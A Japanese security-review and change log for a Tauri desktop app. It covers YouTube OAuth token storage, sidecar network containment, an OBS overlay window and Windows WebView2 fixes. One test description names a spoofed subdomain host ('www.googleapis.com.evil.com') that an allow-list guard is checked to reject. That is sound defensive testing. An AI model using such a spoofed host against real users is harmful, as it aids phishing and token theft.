    （`scripts/test-host-guard.mjs`）で Google 宛先許可・非許可 host/port・サブドメイン偽装（`www.googleapis.com.evil.com`）・Twitch/oauth を
    gRPC target に不可、を全 PASS。
  - **封じ込め**: インターネットは sidecar プロセスのみ・**main は no-internet 維持**（gRPC egress も sidecar のみ）。**Rust は完全同期**
    （async/WS/HTTP crate を足さない・`Cargo.toml` 不変）。同意 URL は sidecar→Rust stdout `COMMENT_SIDECAR_OPEN_URL=` で渡し、
    **Rust が host=accounts.google.com を fail-closed 検証**（http/port/userinfo/サブドメイン偽装を拒否・Rust ユニットテスト2件 PASS）してから
    既存 `tauri-plugin-opener`（IPC 非経由・新規 capability なし）で開く。`open` パッケージは sidecar に足さない。frontend は URL に触れない。
  - **資格情報（§9）**: YouTube の OAuth トークン・PKCE `code_verifier`・**Client Secret** は **in-memory のみ（keyring 永続化しない
    ＝Twitch と対比）**・非ログ・非外部送信（**注: この判定はレビュー時点の設計。032c-d′ で OAuth トークンは Twitch と同様の keychain
    永続化に変更したため、下記「追補（032c-d′…）」を参照し再レビュー対象とする**）。stdout の OPEN_URL 行に載るのは URL の `code_challenge`（S256・非機密）で `code_verifier`・secret は
    載らない。Rust は URL 全体をログに出さず host のみ。取得コメントは画面表示のみで端末外に出さない。ソース grep で token/secret/verifier の
    console 出力ゼロを確認。
  - **Client Secret 同梱の根拠**: Google「Desktop app」OAuth の secret は機密扱いされず抽出前提だが、抽出されても **PKCE＋インストール型
    モデル**で被害限定（上記方針⑧）。Twitch Client ID と同様に esbuild define でビルド時に焼き込む（ランタイム env/dotenv 不使用・
    エンドユーザー非露出）。テスト焼き込みの SEA バイナリは `.gitignore`（未追跡）。
  - **クォータ graceful stop**: REST 403 `quotaExceeded` / gRPC `RESOURCE_EXHAUSTED` を分類し、**再接続せず停止**して viewer に FAILED＋理由を
    通知する（osareview の 1 秒 hot-loop 欠陥を持ち込まない・クラッシュしない）。無料枠 10,000 units/日は `product.md` に記録。
  - **依存**: `@grpc/grpc-js`＋`@grpc/proto-loader`（純 JS・ネイティブアドオン無し）を再導入し SEA 禁止依存アサートから外した
    （`@napi-rs/keyring`/`@hono/node-server`/`dotenv` は引き続き bundle に不在を exact 検査で確認）。`open`/`googleapis`/`node-fetch` は足さない。
  - **proto-under-SEA（スパイク1）＋SEA 再署名（スパイク5）＝PASS**: `stream_list.proto` を文字列同梱→起動時に一時ファイル展開→`loadSync`。
    実 SEA バイナリ起動で `stream_list.proto loadable (spike1 OK)`・`codesign --verify` 通過を確認。proto は非機密スキーマで OS 一時領域への
    scratch 書込のみ（ユーザーデータ・秘密ではない）。
  - **capability / CSP 不変**: `capabilities/{default,comment-viewer}.json`・`tauri.conf.json`（`csp: null`）に差分なし。lib.rs に新規 command なし
    （opener は sidecar stdout リーダースレッドから呼び IPC 非経由）。**binding drift ゼロ**（ts-rs `CommentViewDto` は `source: youtube`・
    eventType 4 種が既存で不変・`check:bindings` PASS）。
- **後回し（記録のみ）**: ①ログイン中の **loopback OAuth コールバックサーバ**（`127.0.0.1:ephemeral`・～180 秒の一時 listener）は未認証だが、
  **ランダム state（CSRF）＋PKCE**で保護（偽 code は matching `code_verifier` 無しに Google 側で交換不可）＝viewer WS と同レベルの localhost
  信頼モデル。②event-type は osareview 準拠で **メンバーシップ（NEW_SPONSOR/MEMBER_MILESTONE）→ subscription に畳む**（Rust の `Membership`
  variant は当面未使用）。③**実機の `lsof` 封じ込め（Google/YouTube＋gRPC egress が sidecar PID 下のみ・main no-internet）と実 YouTube ライブ
  E2E・クォータ unit 会計は、Google「Desktop app」OAuth クライアント焼き込み＋実配信で mac GUI（`tauri dev`）実施**（Twitch 032c-b と同様）。
- **docs 整理**: §1 に「例外（032c-d…）」追加＋032c-c/032c-b の forward-ref を「定義済み」に更新、§4（Rust opener で host 検証）・§9（YouTube
  トークン in-memory）・§10/コメントビューア方針①④拡張＋新規⑧（Client Secret 根拠・consent 運用・クォータ）を追記。`product.md` にクォータ記録、
  `task-board.md`/`progress.md` 更新。
- **追補（032c-d′・YouTube ログイン永続化＝§9 ポリシー変更・⚠ 再 security-review 必要）**: 上記レビュー後、UX を Twitch と完全に揃える
  ため、**YouTube ログインも OS キーチェーンに永続化**する変更を追加した（コメントビューア窓の再オープン／アプリ再起動でも再ログイン不要）。
  これは §9 の「YouTube は in-memory のみ・keyring 非永続」を改める**ポリシー変更**なので、**マージ前に security-review を再実施すること**。
  設計前提（032c-b′ の Twitch 永続化と同型に一般化・新しい通信/依存は増やさない）:
  - 既存の Twitch 永続化パイプ（sidecar↔Rust の親子 private pipe）を **provider 対応に一般化**した。`PersistingTokenStore` が
    twitch/youtube 双方の save/clear を **provider 付き**で通知し、stdout 専用行 `COMMENT_SIDECAR_TOKEN=<provider> <json>` /
    `..._TOKEN_CLEAR=<provider>`、復元は stdin `COMMENT_SIDECAR_RESTORE=<provider> <json>`。sidecar は不正/未知 provider を復元しない。
  - **keychain 所有は Rust 側**（`keyring` crate・同期・`Cargo.toml`/`Cargo.lock` 差分ゼロ＝新規 crate なし）。account は provider 別
    （`twitch-comment-viewer` / `youtube-comment-viewer`）。未知 provider は `account_for` が `None`＝保存/読取しない（fail-closed）。
  - **永続対象は OAuth トークン一式（TokenSetPlain＝access/refresh/expiry/scope）のみ**。`code_verifier`（一時値）・`Client Secret`（焼き込み）
    は **引き続き非永続**（TokenSetPlain に含まれない）。token は viewer WS に載せず private pipe のみ・非ログ（§9 不変）。封じ込め・§1・§4・
    capability・CSP（`csp:null`）・binding は不変。
  - **留意**: consent 画面が「テスト」モードだと YouTube refresh_token は 7 日失効するため、保存していても 7 日後は復元失敗→再ログイン
    （graceful）。恒久保持には consent 画面の本番公開が要る（運用前提）。macOS の keychain アクセスは **署名済み配布（Developer ID＋
    notarization）で無音**（未署名 dev ビルドはリビルドのたびに確認ダイアログが出る＝署名で解消）。
  - **マージ前 GUI 検証**: YouTube 再ログイン不要（窓再オープン／アプリ再起動）・logout/失効で keychain クリア・`lsof`/`app_logs`/stdout/stderr に
    token 非露出（token は private pipe のみ）・macOS Keychain に `stream-dock`/`youtube-comment-viewer` エントリ 1 件。
- **追補（032c-d″・YouTube 取得の継続性修正＋観測性・宛先/依存/capability 不変）**: 実ライブ検証で「取得開始→数秒で待機・コメント取得できず」を
  修正した。原因は (1) 配信終了監視 `monitorLiveStreamEnd` が YouTube を `search.list`（100 units・eventual consistency）で 5 秒ごとに再検出し、
  生存中でも null が返って誤って「配信終了」→ IDLE、かつクォータを急速消費（~1,200 units/分）、(2) `retryOnStreamEnd` を開始時再検出フラグに束ねて
  false 固定していたため gRPC streamList が最初に閉じた時点で自然完了 IDLE に落ちていた。修正内容:
  - **監視を `videos.list`（by-id・1 unit・整合的）＋連続 miss 閾値(3) に置換**（YouTube のみ・Twitch は Helix `/streams` のまま不変）。宛先は
    `www.googleapis.com`（**既存 allow-list 内・新規宛先ゼロ**）。クォータ消費を ~1,200 units/分 → ~12 units/分に低減（product.md の「枯渇時 graceful stop」と整合）。
  - **YouTube は `retryOnStreamEnd=true`（開始時再検出とは独立）** で nextPageToken 再接続し継続取得。配信終了は監視が有限回（≤3×5s）で確定し停止。
  - **観測性（§9・ログ出力処理）**: 従来 Rust reader が握りつぶしていた **sidecar stderr を Rust の stderr（`tauri dev` 端末）へ透過**する（取得失敗の
    原因が見えるように）。**token/secret は §9 で stderr に載せない設計のため露出せず**、外部送信・DB 保存はせず**ローカル端末出力のみ**。配信終了 IDLE に
    固定文言の理由（「配信の終了を検知しました。」）を付与。**新規依存・capability・CSP（`csp:null`）・Cargo は不変**。
- **追補（032c-d‴・クォータ大幅削減：検出の liveBroadcasts 化＋監視の silence-gated 化・宛先/スコープ/capability 不変）**: 「消費しすぎ」への対応。
  - **検出を `search.list`（100 units・検索インデックス遅延）→ `liveBroadcasts.list`（`broadcastStatus=active`・1 unit・配信管理APIで即時整合）に置換**。
    id/liveChatId/title が 1 コールで揃うため従来の `videos.list` 追い打ちも不要。宛先 `www.googleapis.com`（**既存 allow-list 内・新規宛先ゼロ**）、
    スコープは `youtube.readonly` のまま（`liveBroadcasts.list` 読取は同スコープで許可＝**再同意不要**）。
  - **配信終了監視を silence-gated（無言監視）に再設計**: コメントが流れている間（直近受信から 90s 未満）は `videos.list` を**一切叩かない**
    （＝活発な配信ではクォータ消費ゼロ）。コメントが途切れた時だけ 45s ごとに `videos.list`（1 unit・`activeLiveChatId` は権威情報）で生存確認し、
    連続 2 miss で終了確定。壁時計で回るため gRPC がハートビートで開いたままでも終了を必ず検知できる（"切断時だけ確認" 方式は「接続中のまま
    止まらない」危険があるため採らない）。一時エラーは inconclusive（miss に数えず継続＝誤終了防止）。**取得ループ(usecase)・`retryOnStreamEnd`・
    型・Twitch 経路・capability・CSP・Cargo は不変**。
  - **消費**: 活発な配信の監視分を ~360 units/3h → **実質 ~0** に低減（検出は 100→1）。コメント本体 gRPC streamList は未実測（実配信で Cloud Console 実測予定）。

### 032c-a らくらくツール設定 032b（棒読み×VOICEVOX）撤去（ループバック通信 / 外部設定書換 / `ureq` / SAPI レジストリ読取の削除・security-review 実施済み）

- 032c 方針転換（内蔵コメントビューア × VOICEVOX 直接読み上げ）に伴い、032b で追加した棒読みちゃん×VOICEVOX
  連携の**棒読み/SAPI 依存部分**を撤去した。削除対象: `rakuraku/integrations/bouyomi_voicevox.rs` 全体
  （`#[cfg(windows)] mod imp`）／`Integration` trait の `configure`/`verify` メソッド／`rakuraku_configure_integration`・
  `rakuraku_verify_integration` コマンドと `lib.rs` 登録／`ConfigureResult`/`VerifyResult` 系 model・TS binding／
  `Cargo.toml` の `ureq` 依存・`windows` feature `Win32_System_Registry`。frontend 側は `integrationRegistry` の唯一の
  エントリ・`rakurakuApi` の configure/verify ラッパ・ExecutionView の設定書換/疎通経路を撤去。
- **security-review を実施し、判定＝問題なし**（修正必須なし・攻撃面は縮小方向）。確認事項:
  - **外部通信の限定解禁を全撤去**: `ureq`（`127.0.0.1:50021`）・`std::net::TcpStream`（`127.0.0.1:50001`）の利用箇所は
    `bouyomi_voicevox.rs` のみで、同ファイル削除後は残らない（grep で他用途ゼロを確認）。§1（外部通信をしない）の
    一般原則へ復帰。**本タスクでは外部通信の新規解禁は追記しない**（VOICEVOX 直接読み上げの通信方針は 032c-b）。
  - **外部設定書換の限定解禁を撤去**: 棒読みちゃん設定ファイルの書換（バックアップ先取り）経路を削除。§5（外部設定を
    上書きしない）の一般原則へ復帰。app 管理領域外への書込は行わない。
  - **レジストリ読取を撤去**: SAPI トークン列挙（`Win32_System_Registry`・`RegOpenKeyExW`/`RegEnumKeyExW`）の利用は
    `bouyomi_voicevox.rs` のみで、削除後に未使用（grep 確認）。`Cargo.toml` から feature を外した。
  - **capability / CSP 不変**: `capabilities/default.json` / `tauri.conf.json`（`csp: null`）に差分なし。新規 command は
    追加せず、`rakuraku_*` は 2 本削減（scan / launch / open_official_page の 3 本は温存）。
  - **温存した共有部**: らくらく画面シェル（一覧/詳細/同意/実行の器）・`rakuraku_launch_component`（登録済み exe を
    管理付き `spawn`＋PID registry で起動）・`rakuraku_open_official_page`・`resolve_tool_for_component`。これらの
    セキュリティ方針は上記「らくらくツール設定（外部アプリ連携）方針」に集約済み（撤去で挙動は変わらない）。撤去後
    `registry()` は空で、`find` は常に `NotFound` を返す（空でもらくらく画面はクラッシュしない）。
  - **binding drift ゼロ**: 削除した Rust 型の残骸 TS（`ConfigureResult.ts`/`ConfigureStatus.ts`/`VerifyResult.ts`/
    `VerifyStatus.ts`）を手動削除し、`gen:bindings` 再実行で差分ゼロを確認。
- **docs 整理**: 本 security.md の §1/§5 の 032b 例外・らくらく方針節・032b 系レビュー記録、`docs/product.md` の
  棒読み/SAPI 例外を、撤去に合わせて整理（撤去/整理のみで外部通信の新規解禁追記は含まない）。

### 032 追加対応 らくらくツール設定 詳細画面（YouTube デモ動画 iframe 埋め込み / 非対応 OS ガード・security-review 実施済み）

- 詳細画面のデモ動画を **YouTube（youtube-nocookie）iframe でインライン埋め込み**（アプリ同梱による容量増を避けるため）。
  非対応 OS では「確認画面に進む」を無効化＋小さめ赤文字「(このOSでは利用できません)」を表示。**frontend のみ**
  （registry＋screen＋css）・Rust/Cargo/capabilities/`tauri.conf.json`（`csp: null`）不変。詳細は上記 CSP方針の「例外」を参照。
- **security-review を実施し、判定＝問題なし**（修正必須なし）。確認済み: youtube-nocookie＋`rel=0`（Cookie/関連動画抑制・
  telemetry 追加なし）／動画 ID は frontend 定数を `^[A-Za-z0-9_-]{11}$` でガードしてから src を組み立て（URL/属性の
  ブレイクアウト不可・未設定/不正は「準備中」フォールバック）／iframe 属性は最小・安全側（`allow` は
  encrypted-media/fullscreen/picture-in-picture のみ・`referrerpolicy=strict-origin-when-cross-origin`・`loading=lazy`・`title`）／
  クロスオリジン外部フレームで Tauri IPC 非接触・新規依存/command/capability なし・`csp:null` 不変／OS ガードは UI のみで多重防御。
- **留意点（動画 ID 設定後に `tauri dev` で確認）**: 現状 `demoVideoId` 未設定のため外部通信は未発生。実 ID 設定後、
  ① インライン再生 ② フレーム内操作でアプリウィンドウが外部 URL へ遷移/想定外ポップアップしないこと を確認する。
  top-navigation/popups が起きる場合は `sandbox="allow-scripts allow-same-origin allow-presentation"`（top-nav/popups 非付与）を
  追加し再生維持を確認する。将来 CSP を効かせる際は `frame-src https://www.youtube-nocookie.com`（＋派生ドメイン）が必要。

### 033f コメントビューア OBS 透過オーバーレイ窓（新規 per-window capability＋`macos-private-api` feature・security-review 実施済み）

- コメント一覧を OBS の「ウィンドウキャプチャ」へ載せるため、背景透過のオーバーレイ窓（label `comment-overlay`）を
  ワンクリックで開く機能を追加した（親 033・問題 9）。obs-websocket は不採用（新規 localhost 接続面を作らない）。
  データ源は**既存の loopback sidecar WS（`ws://127.0.0.1:<port>`）の読み取り専用接続のみ**で、**新規外部通信ゼロ・新規依存ゼロ**。
- **security-review を実施し、判定＝問題なし**（修正必須なし）。確認事項:
  - **新規外部通信ゼロ・読み取り専用**: `OverlayApp` は `connectCommentStream({ onComments })` のみで制御フレーム
    （start-login / start-session / stop-session）を一切送らない＝送信フレームゼロ。外部 http(s)/WS 宛先の新規追加なし。
    **main とその Rust command は no-internet 維持**（§1／方針②）。新通信面を作らないため security.md 本体への §1 例外追記は不要。
  - **capability 最小・main/comment-viewer 不変**: 新設 `capabilities/comment-overlay.json` は `core:default` のみ＋
    `windows:["comment-overlay"]` に scope 限定。`default.json`（`windows:["main"]`）・`comment-viewer.json` は差分ゼロで、
    overlay 窓は main の `core:window`（close/minimize 等）/dialog/autostart 権限を継承しない。アプリ定義 command
    （`open/close_comment_overlay_window`・引数は `AppHandle` のみ・固定ラベル/固定オプション）は本構成では ACL 列挙不要。
  - **プロセス/no-orphan kill 不変（§6）**: overlay は表示専用で sidecar を起動/停止しない（`ensure_started` 無し・
    窓イベント登録無し・close で `shutdown` 連動無し）。PID kill・プロセス名 kill なし。sidecar 起動/停止契機は
    コメビュ窓（`open_comment_viewer_window` の窓イベント／`RunEvent::Exit`）に集約のまま。
  - **依存（§10）・CSP 不変**: 新規 crate/npm/plugin ゼロ。透過描画のため既存 `tauri` crate に **`macos-private-api`
    feature を追加**（新規 crate ではなく feature 追加＝028 の `windows` feature と同型）＋`tauri.conf.json` に
    `app.macOSPrivateApi: true`。`csp: null` 不変・外部 script/style/image 非増加。透過 CSS は overlay 窓の document
    （`data-overlay="1"`）にだけ効き main/comment-viewer に波及しない。
  - **MAS 配布不可の受容**: macOS 私的 API 使用のため Mac App Store 配布不可になるが、本アプリは .app/.dmg 直配布で
    MAS 経路が無いため受容（IPC/権限/ネットワークの攻撃面は増えず、透過描画に閉じる）。`background_throttling(Disabled)`
    は webview の描画/タイマー スケジューリング設定のみで通信/権限/プロセスに触れない（macOS14+ のみ有効・Windows/Linux は no-op）。
  - **binding drift ゼロ**: 追加 command は引数 `AppHandle`・戻り `AppResult<()>` で新規 ts-rs 型なし（`check:bindings` 32 passed）。
- **後回し（記録のみ）**: overlay を開くと sidecar への loopback WS 接続が 1 本増える（コメビュ本体に加えて）が、
  sidecar は全クライアントへ同報するだけで overlay は読み取り専用購読＝本体セッションに影響せず、close/unmount で
  `disconnect()` される（032c-b の loopback WS と同レベルの localhost 信頼モデル）。**実機（macOS 14.6.1）で `lsof -i` の
  外部 ESTABLISHED が sidecar PID 下のみ・overlay/main に出ないこと、OBS ウィンドウキャプチャの透過ライブ合成を目視**（`tauri dev`）。

### Windows 窓生成デッドロック修正（窓生成到達コマンド 4 本の `(async)` 化＋WINDOW_OPEN_LOCK・security-review 実施済み）

- Windows（x64/ARM）で内蔵コメントビューアの起動時に白画面のままアプリ全体が応答なしになる不具合を修正した
  （実機で発覚したアドホック修正・タスク doc なし）。原因は Tauri v2 の非 async コマンドがメインスレッドで実行され、
  同期コマンド内の `WebviewWindowBuilder::build()` が WebView2 生成完了（メインスレッドのメッセージループ経由で
  通知）をループを止めたまま待つ相互待ち＝デッドロック（wry#583・`WebviewWindowBuilder` doc の Known issues）。
  窓生成に到達し得る 4 コマンド（`open_comment_viewer_window` / `open_comment_overlay_window` / `launch_tool` /
  `launch_preset`）を `#[tauri::command(async)]` 化（関数は同期のまま・実行だけ tauri async runtime の tokio worker へ
  移す）し、失われるメインスレッド直列実行の代替に `WINDOW_OPEN_LOCK`（`Mutex<()>`・viewer/overlay 共有）で
  窓生成を直列化した。macOS は WKWebView の生成が同期完了するため顕在化しなかった。
- **security-review を実施し、判定＝問題なし**（修正必須なし）。「process 起動処理」のレビュー必須条件に該当
  （`launch_tool` / `launch_preset` の実行スレッド変更）。確認事項:
  - **面・権限の完全不変（§3）**: 新コマンド・引数・戻り値・呼び出し側・frontend・capabilities 3 ファイル・
    `tauri.conf.json`（`csp: null`）に差分ゼロ。`(async)` は frontend から透過（invoke は元々 Promise）。
    実行スレッドは本書の管理対象面（コマンドの面・引数・権限・起動経路）に含まれないため、本文の方針・例外定義は
    一切変更しない（本節は実施記録のみ）。
  - **spawn/停止経路の非退行（§6）**: `validate_executable` → 管理付き spawn → registry 登録 → launchId 限定停止に
    変更なし。並行化（従来のメインスレッド直列 → 並行実行）による新たな多重 spawn は無い（直列はキューイングで
    あって重複排除ではなく spawn 回数の意味論は不変・DB/registry は Mutex 保護・stop は registry 登録済み launchId
    のみ・`boot_launch_presets` が既に別スレッド並行の前例）。
  - **ロック順序**: `WINDOW_OPEN_LOCK` → `CommentSidecarState` の一方向のみで逆順取得ゼロ。メインスレッドが
    `WINDOW_OPEN_LOCK` を取る経路は無く、「worker がロック保持のまま `build()` でメインループの処理完了を待つ」
    構造は相互待ちにならない。close 系（`.close()`＝非ブロッキング送信）・is 系は同期のままで正しい
    （tauri の Known issues 対象は生成系と cookies 系 getter のみ）。
  - **通信・依存・ログ不変**: 新規 `Command::new` / fs 書込 / 通信 / crate 追加ゼロ。「Rust は完全同期のまま」
    （032c-b）は「async/WS/HTTP crate を足さない・コマンド本体は sync fn」の意味で今も真だが、本修正で上記
    4 コマンドは tauri 同梱 async runtime（tokio worker）上で実行される（`spawn_blocking` ではなく
    `async_runtime::spawn` 直実行・worker を窓生成完了まで同期ブロック＝窓生成は稀・短時間のため許容）。
- **マージ前 Windows 実機検証（x64/ARM・未実施）**: 機序は tauri 公式 doc の推奨回避策どおりで理論上解消するが、
  開発機が macOS のため実機確認をマージ条件とする: ①ビューア起動で白画面にならず応答維持 ②viewer/overlay
  連打で二重生成エラーが出ない ③internal 込みプリセット一括起動と個別起動の同時実行 ④窓の開閉高速サイクル
  （close → sidecar shutdown 連動）⑤`--autostart` 一括起動に internal を含む場合 ⑥タスクマネージャで sidecar
  孤児なし。

### 033f 追修正③: Windows で OBS ウィンドウキャプチャが真っ黒になる不具合の解消（WebView2 occlusion 無効化＋OBS 設定案内）

- **症状**: Windows 実機で、オーバーレイ窓（label `comment-overlay`）を OBS の「ウィンドウキャプチャ」に取り込むと
  **窓全体が真っ黒**になる（macOS では同手順で最背面のオーバーレイをそのまま透過取り込みできる）。体感は
  「Windows では最小化されているっぽい」で、最背面（`always_on_bottom`）で完全に隠れた窓が描画停止した状態と符合。
- **原因（Windows 固有・2 系統。実機未検証のため両方に手当て）**:
  1. **WebView2(Chromium) の native window occlusion による描画停止**: オーバーレイは追修正①で `always_on_bottom(true)`
     ＝常に他窓の背後（完全 occluded）。Chromium は完全に隠れた窓の描画を止める最適化（feature
     `CalculateNativeWinOcclusion`）を持ち WebView2 も継承するため、DWM の窓表面が更新されず OBS が真っ黒を取り込む。
     追修正②の `background_throttling(Disabled)` は **macOS の WKWebView `inactiveSchedulingPolicy` 専用**で
     Windows/WebView2 には効かず、Windows 版の等価対策が欠けていた。
  2. **OBS のキャプチャ方式（設定側）**: Windows の旧「BitBlt」方式は GPU 描画/透過の WebView2 窓を取り込めず黒くなる。
     「Windows 10（WGC / Windows Graphics Capture）＋透過を許可」が必要。macOS のキャプチャ backend はこの区別が無い。
- **修正（コード）**: `open_comment_overlay_window`（`apps/desktop/src-tauri/src/lib.rs`）の `WebviewWindowBuilder` に
  **`.additional_browser_args("--disable-features=msWebOOUI,msPdfOOUI,msSmartScreenProtection,msWebView2AutoDetectHighContrast,CalculateNativeWinOcclusion")`** を追加。
  `CalculateNativeWinOcclusion` を無効化して隠れていても描画を続けさせる（macOS の `background_throttling(Disabled)` の
  Windows 版に相当）。**`additional_browser_args` は wry の既定引数を「追加」ではなく「丸ごと置換」する**（指定時は wry 側の
  既定生成が走らない）ため、wry 0.55.1 の既定 `msWebOOUI,msPdfOOUI,msSmartScreenProtection`（ミニメニュー/PDF UI/SmartScreen
  無効化。SmartScreen 無効化は tauri#1345 由来のプライバシー配慮で §1 とも整合）を**明示保持**し、透過窓向けに高コントラスト
  自動検出無効化(`msWebView2AutoDetectHighContrast`)も足す（既定をサイレントに落とさない）。WebView2 専用引数のため macOS/Linux は
  no-op（非退行）。※当初は `msWebView2AutoDetectHighContrast` を「wry 既定」と誤認し実既定 3 種を落としていたのを
  security/品質レビュー指摘で修正（2026-07-24）。実機で黒が残る場合の次手は `--disable-backgrounding-occluded-windows` 併用。
- **修正（案内）**: 設定ビューの「OBSオーバーレイ」カード（`SettingsView.tsx`）に、**Windows 実行時のみ**
  「キャプチャ方式＝Windows 10（1903 以降）を選び透過を許可 ON に」する一文を追加。OS 判定は既存フック
  `useHostOs`（Rust `host_os`・タイトルバー出し分けと同経路）を読み取り専用で再利用（新規 state/API/依存なし）。
- **security 自己確認（指摘なし）**: OS/プロセス/ファイル操作の変更なし。宛先・API・capability・依存・CSP を増やさない
  （`comment-overlay.json` は最小権限のまま・`csp: null` 不変）。`additional_browser_args` は当該窓 WebView2 の描画最適化を
  切るのみで攻撃面を増やさない。アプリ内ヒントは非機密 UI 文言 1 行の追加。
- **やらないこと**: `always_on_bottom`（最背面で隠す UX・追修正①）の変更／obs-websocket 等での OBS ソース自動追加
  （033f 方針どおり不採用）／意匠・データ取得・sidecar 連動の変更／新規ライブラリ追加。
- **Windows 実機検証（未実施・マージ条件）**: 開発機が macOS のため実機確認をマージ条件とする。①オーバーレイ表示 ON →
  OBS のウィンドウキャプチャ（WGC＋透過許可）でコメントが**色付きで映り真っ黒でない** ②透過部分が抜け、最背面のまま
  配信者画面の前面に出ない ③切り分け＝occlusion 無効化を外すと黒に戻るか／OBS を BitBlt に戻すと黒くなるか ④macOS 回帰＝
  従来どおり透過取り込みできる（`additional_browser_args` は macOS で無視され挙動不変）。

### 変更ファイル（033f 追修正③）

- Rust（変更）: `apps/desktop/src-tauri/src/lib.rs`（overlay Builder に `additional_browser_args` で occlusion 無効化＋doc）
- frontend（変更）: `apps/desktop/src/screens/comment-viewer/SettingsView.tsx`（Windows 限定の OBS 設定ヒント・`useHostOs` 再利用）

## 2026-07-24 041a コメビュ読み上げ 読み替えエンジン＋内蔵一般辞書（frontend 純テキスト置換・security-review 実施済み）

親 [041](tasks/041-comment-viewer-reading-dictionary.md) の要求1（ネットスラング/英語略語の誤読解消）を、
VOICEVOX へ渡す**前**の frontend テキスト置換で実装。ユーザー編集辞書の重ね合わせ・UI・localStorage 永続は 041b（本タスクは内蔵のみ）。

### やったこと

- **読み替えエンジン新設**（`apps/desktop/src/features/comment-viewer/readingDictionary.ts`）:
  - 型 `ReadingRule = { surface; reading; kind:"text"|"regex" }`。
  - `applyReadingDictionary(text, rules)` は**単一パスのトークナイザ・最長一致＋定義順**。左から 1 走査し各位置で
    「その位置に開始する一致」の最長を採用（同一長は先に定義したルールが勝つ）。これで「短い語が長い語を先食い」と
    「置換後の読みを後続ルールが再マッチ」を構造的に防ぐ。`kind:"text"` は `startsWith` 一致、`kind:"regex"` は
    sticky（`iuy`）で位置一致。辞書空/未注入は入力を素通し（現行動作）。trim はせず呼び出し側で行う。regex コンパイルは
    try/catch で不正ソースを no-op に縮退。
  - **内蔵辞書 `BUILTIN_READING_DICTIONARY`（自前データ・全18件）**: 笑い w（直前が英字なら非変換で law/how は壊さず。
    `(?<![A-Za-z])w{2,}`→わらわら／`(?<![A-Za-z])w`→わら の 2 本で、w が 1 つなら「わら」・2 つ以上（末尾含む）なら「わらわら」。
    最長一致が w{2,} を先取りするため連続 w はまとめて 1 回「わらわら」＝回数に比例させない）／保護 5件（煙草→たばこ・草原→そうげん・草食→そうしょく・雑草→ざっそう・
    乙女→おとめ。単漢字スラングより長いので最長一致で先取り）／スラング単漢字 草→くさ・乙→おつ／略語 kwsk・wktk／
    英語・tech 略語 6件（ChatGPT/API/OBS/URL/PC/OS を `\b`＋`i` で語境界一致）／記号 →→やじるし。網羅は狙わず高頻度のみで、
    七草/早乙女/草案 等の希少衝突は残る（041b のユーザー辞書で補う前提）。第三者辞書（MeCab/NEologd/IPAdic/棒読みちゃん/
    VOICEVOX 同梱）のデータ・コードは転載/機械変換していない。
- **TTS パイプライン組み込み**（`ttsQueue.ts`）: `TtsQueueOptions` に `getReadingDictionary?: () => ReadingRule[]` を
  `getSpeakerId` と同じ getter 注入で追加。`enqueue` で `sanitizeForSpeech` の**後段**に `applyReadingDictionary(sanitized,
  getReadingDictionary?.() ?? []).trim()` を適用し、**空判定は適用後**で行う（既存スキップ挙動を維持）。省略/空辞書は素通し。
- **配線**（`CommentViewerApp.tsx`）: 既存の `createTtsQueue({ getSpeakerId })` に `getReadingDictionary: () =>
  BUILTIN_READING_DICTIONARY` を追加（041a は内蔵のみ。041b のユーザー辞書ライブマージを見据え getter 注入の形にした）。

### security-review 結果＝問題なし（修正必須なし）

- **外部通信/依存/CSP 不変**（§1/§10・`csp: null`）: fetch/invoke/network の追加ゼロ。readingDictionary は純関数（RegExp/String のみ）。
  ttsQueue は既存 `synthesize`/`playWav`（loopback 50021・voicevox.ts 経由）のまま。telemetry/CDN/remote config なし。
- **Rust/capability/ファイル/プロセス操作の変更なし**（`tauri.conf.json`・capability ファイル・package.json いずれも無変更）。
- **内蔵辞書は自前データ**（第三者辞書の転載でない）。**regex は内蔵定数のみを `new RegExp` に渡す**（041a にユーザー入力 regex なし）。
- **ReDoS を招かない**: 内蔵 regex は `(?<![A-Za-z])w{2,}` / `(?<![A-Za-z])w` / `\b<略語>\b` のみ＝線形時間・入れ子/連鎖量指定子なし。
- **ログ不変**（§9）: 新規ログなし・コメント本文を DB/ログに出さない・regex コンパイル失敗は無言で no-op。
- 申し送り（041b）: 「regex は内蔵定義のみ・ユーザー入力は `kind:"text"` 固定」の不変条件を維持すること（任意正規表現を書かせない）。

### 検証結果

- `pnpm --filter ./apps/desktop typecheck` / `lint` = **pass**。`git diff --stat` = 変更は ttsQueue.ts / CommentViewerApp.tsx ＋
  新規 readingDictionary.ts のみ（Rust/config/deps 変更なし）。`cargo check` は Rust 変更なしのため省略。
- エンジン＋内蔵パターンの Node 単体サニティ（V8＝WebView2/Chromium と同じ lookbehind）: w→わら・ww/www/wwww→わらわら・
  楽しいw→楽しいわら・楽しいww/楽しいwwww→楽しいわらわら（1つ=わら／2つ以上=わらわら）／law・how・few→非変換／
  ChatGPT・chatgpt→チャットジーピーティー（大小無視）／煙草→たばこ・草原で草ww→そうげんでくさわらわら／乙女→おとめ・乙→おつ／
  配信API→配信エーピーアイ／curl・capital→非変換（`\b` ガード）／17時→18時→やじるし／空辞書素通し、の 19 ケース＋passthrough すべて pass。
- **未実施（ユーザー環境で確認予定）**: 実機 `pnpm --filter ./apps/desktop tauri dev` でコメビュに "wwww" / "ChatGPT すごい" を
  流し「わら」「チャットジーピーティー」等で読まれること・辞書空/適用後空でも従来どおり読み上げが動くこと。

### 変更ファイル（041a）

- frontend（新規）: `apps/desktop/src/features/comment-viewer/readingDictionary.ts`
- frontend（変更）: `apps/desktop/src/features/comment-viewer/ttsQueue.ts`（getReadingDictionary 追加・enqueue で sanitize 後段適用）
- frontend（変更）: `apps/desktop/src/screens/comment-viewer/CommentViewerApp.tsx`（BUILTIN_READING_DICTIONARY を getter で配線）

### 033f 追修正③ 回帰修正: Windows で OBS オーバーレイ窓が一切開かない不具合の解消（全窓 additionalBrowserArgs 一致）

- **症状（回帰）**: 追修正③（`3e95a09`）以降、**Windows でオーバーレイ窓（label `comment-overlay`）が一切開かない**
  （起動しても表示されない・接続やコメント取得の有無に関係ない）。macOS では再現しない。
- **原因**: 追修正③で **overlay 窓にだけ** `additional_browser_args` を付けたこと。Windows の WebView2 は
  「1 つの user data folder(UDF)＝1 つのブラウザプロセス」で、その起動引数は**最初に生成された窓**（本アプリでは
  tauri.conf.json 由来の `main`）が確定する。UDF を共有する後続窓が**異なる**引数で生成しようとすると WebView2 環境生成が
  `ERROR_INVALID_STATE`(`HRESULT 0x8007139F`) で失敗し `.build()` が Err → 窓が開けない。`main`/`comment-viewer` は
